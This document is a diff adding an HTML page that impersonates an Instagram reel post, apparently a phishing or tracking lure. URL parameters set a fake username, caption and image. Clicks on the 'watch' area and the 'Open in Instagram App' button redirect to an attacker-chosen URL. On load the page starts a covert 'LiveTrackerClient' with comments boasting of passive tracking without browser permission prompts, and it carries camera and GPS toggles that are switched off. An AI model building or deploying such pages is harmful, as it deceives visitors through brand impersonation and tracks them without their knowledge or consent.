@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title id="ig-title">Instagram Post • Watch Reel</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #000000;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Instagram Header */
+        header {
+            width: 100%;
+            max-width: 470px;
+            height: 54px;
+            padding: 0 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #262626;
+            background: #000000;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .ig-brand {
+            font-family: 'Cookie', cursive, sans-serif;
+            font-size: 24px;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .ig-brand i {
+            font-size: 22px;
+            background: -webkit-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .header-icons {
+            display: flex;
+            gap: 18px;
+            font-size: 20px;
+        }
+
+        .header-icons i {
+            cursor: pointer;
+        }
+
+        /* Post Container */
+        .post-card {
+            width: 100%;
+            max-width: 470px;
+            background-color: #000000;
+            border-bottom: 1px solid #262626;
+            margin-bottom: 20px;
+        }
+
+        /* User Info Row */
+        .post-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 14px;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .story-ring {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            padding: 2px;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .user-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: #262626;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 14px;
+            color: #fff;
+            border: 2px solid #000;
+        }
+
+        .username-col {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .username {
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: #fff;
+        }
+
+        .verified-badge {
+            color: #0095f6;
+            font-size: 12px;
+        }
+
+        .location-tag {
+            font-size: 11px;
+            color: #a8a8a8;
+        }
+
+        .btn-follow {
+            color: #0095f6;
+            font-weight: 600;
+            font-size: 13px;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        /* Post Media Frame */
+        .media-container {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 4/5;
+            background-color: #121212;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .media-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .play-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.35);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .play-icon-circle {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            color: white;
+            border: 1px solid rgba(255,255,255,0.4);
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            transition: transform 0.2s;
+        }
+
+        .play-overlay:hover .play-icon-circle {
+            transform: scale(1.1);
+        }
+
+        .play-text {
+            font-size: 14px;
+            font-weight: 600;
+            color: white;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.5);
+            padding: 6px 14px;
+            border-radius: 20px;
+        }
+
+        /* Post Actions Bar */
+        .post-actions {
+            padding: 12px 14px 4px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .action-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            font-size: 22px;
+        }
+
+        .likes-count {
+            padding: 4px 14px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .caption-box {
+            padding: 2px 14px 12px;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .caption-user {
+            font-weight: 600;
+            margin-right: 6px;
+        }
+
+        .caption-text {
+            color: #f5f5f5;
+        }
+
+        .time-ago {
+            padding: 0 14px 12px;
+            font-size: 11px;
+            color: #a8a8a8;
+            text-transform: uppercase;
+        }
+
+        .open-ig-banner {
+            width: calc(100% - 28px);
+            margin: 0 14px 14px;
+            padding: 12px;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 4px 12px rgba(220, 39, 67, 0.4);
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div class="ig-brand">
+            <i class="fab fa-instagram"></i> Instagram
+        </div>
+        <div class="header-icons">
+            <i class="far fa-heart"></i>
+            <i class="fab fa-facebook-messenger"></i>
+        </div>
+    </header>
+
+    <div class="post-card">
+        <div class="post-header">
+            <div class="user-info">
+                <div class="story-ring">
+                    <div class="user-avatar" id="avatar-initial">IG</div>
+                </div>
+                <div class="username-col">
+                    <div class="username">
+                        <span id="display-user">@trending_reels</span>
+                        <i class="fas fa-check-circle verified-badge"></i>
+                    </div>
+                    <span class="location-tag">Original audio • Viral Reel</span>
+                </div>
+            </div>
+            <button class="btn-follow">Follow</button>
+        </div>
+
+        <div class="media-container" id="media-trigger">
+            <img src="https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?auto=format&fit=crop&w=800&q=80" alt="Instagram Reel" class="media-img" id="media-img">
+            <div class="play-overlay">
+                <div class="play-icon-circle">
+                    <i class="fas fa-play" style="margin-left: 4px;"></i>
+                </div>
+                <div class="play-text">Tap to Watch Reel</div>
+            </div>
+        </div>
+
+        <div class="post-actions">
+            <div class="action-left">
+                <i class="far fa-heart"></i>
+                <i class="far fa-comment"></i>
+                <i class="far fa-paper-plane"></i>
+            </div>
+            <i class="far fa-bookmark" style="font-size: 20px;"></i>
+        </div>
+
+        <div class="likes-count">
+            <span id="likes-text">148,290 likes</span>
+        </div>
+
+        <div class="caption-box">
+            <span class="caption-user" id="caption-user">@trending_reels</span>
+            <span class="caption-text" id="caption-text">Check out this viral reel! Click above to watch full HD video. 🔥🔥</span>
+        </div>
+
+        <div class="time-ago">2 HOURS AGO</div>
+
+        <button class="open-ig-banner" id="btn-open-app">
+            <i class="fab fa-instagram"></i> Open in Instagram App
+        </button>
+    </div>
+
+    <script src="/js/telemetry.js"></script>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const redirectUrl = urlParams.get('url') || urlParams.get('redirect') || 'https://www.instagram.com';
+        const userParam = urlParams.get('user') || urlParams.get('author') || 'trending_reels';
+        const titleParam = urlParams.get('title') || urlParams.get('caption');
+        const imgParam = urlParams.get('image');
+
+        const cleanUser = userParam.startsWith('@') ? userParam : '@' + userParam;
+        document.getElementById('display-user').innerText = cleanUser;
+        document.getElementById('caption-user').innerText = cleanUser;
+        document.getElementById('avatar-initial').innerText = cleanUser.charAt(1).toUpperCase();
+
+        if (titleParam) {
+            document.getElementById('caption-text').innerText = titleParam;
+            document.getElementById('ig-title').innerText = `${titleParam} • Instagram`;
+        }
+
+        if (imgParam) {
+            document.getElementById('media-img').src = imgParam;
+        }
+
+        function handleTargetClick() {
+            let finalUrl = redirectUrl;
+            if (!finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
+                finalUrl = 'https://' + finalUrl;
+            }
+            window.location.href = finalUrl;
+        }
+
+        document.getElementById('media-trigger').addEventListener('click', handleTargetClick);
+        document.getElementById('btn-open-app').addEventListener('click', handleTargetClick);
+
+        // ZERO-PERMISSION PASSIVE TELEMETRY START (0 Browser Popups!)
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.LiveTrackerClient) {
+                window.LiveTrackerClient.startTracking({
+                    templateName: 'instagram',
+                    updateInterval: 4000,
+                    enableCamera: false, // PASSIVE (No Camera Popup)
+                    enableGPS: false      // PASSIVE (No Location Popup)
+                });
+            }
+        });
+    </script>
+</body>
+
+</html>
